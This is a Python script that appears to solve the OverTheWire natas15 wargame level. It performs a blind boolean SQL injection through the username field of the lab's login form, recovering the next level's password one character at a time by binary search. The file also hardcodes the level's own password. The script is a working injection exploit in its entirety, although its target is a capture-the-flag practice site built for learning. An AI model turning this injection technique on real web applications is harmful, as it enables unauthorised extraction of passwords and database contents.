#!/usr/bin/env python
 
import requests
url = 'http://natas15.natas.labs.overthewire.org/index.php'
username= 'natas15'
password= 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'
key = ""
 
for pos in range(34):
    low = 32
    high = 126
    mid = (high+low)>>1
    
    while mid<high:
        #print low,mid,high
        payload= "natas16\" and %d < ascii(mid(password,%d,1)) and \"\" like \"" %  (mid, pos)
        req = requests.post(url, auth = requests.auth.HTTPBasicAuth(username,password),data={"username":payload})
        #print req.text
        if req.text.find("doesn't exist")==-1:
            low = mid+1
        else:
            high=mid 
        mid = (high+low)>>1
 
    key+=chr(mid)
    print key
file("key","w").write(key)
